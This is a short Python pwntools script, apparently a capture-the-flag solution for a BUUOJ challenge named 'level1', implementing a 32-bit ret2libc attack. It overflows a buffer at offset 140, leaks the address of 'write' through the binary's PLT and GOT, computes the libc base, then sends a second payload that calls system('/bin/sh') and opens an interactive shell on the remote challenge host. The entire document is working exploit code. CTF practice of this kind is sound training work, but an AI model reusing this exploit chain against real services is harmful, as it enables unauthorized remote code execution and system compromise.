#Made by fly_autumn
#x86 解法1 ret2libc
from pwn import *
#p = process("./level1")
p = remote("node5.buuoj.cn",28049)
elf = ELF("./level1")
libc = ELF("./libc.so.6")
context(os="linux",arch="i386")

offset = 140
write_plt = elf.plt["write"]
write_got = elf.got["write"]
main_addr = elf.sym["main"]

payload = b"\x00" * offset + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
p.sendline(payload)
write_addr = u32(p.recv(4))
log.success("write addr: "+hex(write_addr))
libc_addr = write_addr - libc.sym["write"]
log.success("libc addr: "+hex(libc_addr))
sys_addr = libc_addr + libc.sym["system"]
log.success("system addr: "+hex(sys_addr))
sh_addr = libc_addr + next(libc.search(b"/bin/sh"))
log.success("sh addr: "+hex(sh_addr))
payload2 = b"\x00" * offset + p32(sys_addr) + p32(0) + p32(sh_addr)
p.sendline(payload2)


p.interactive()
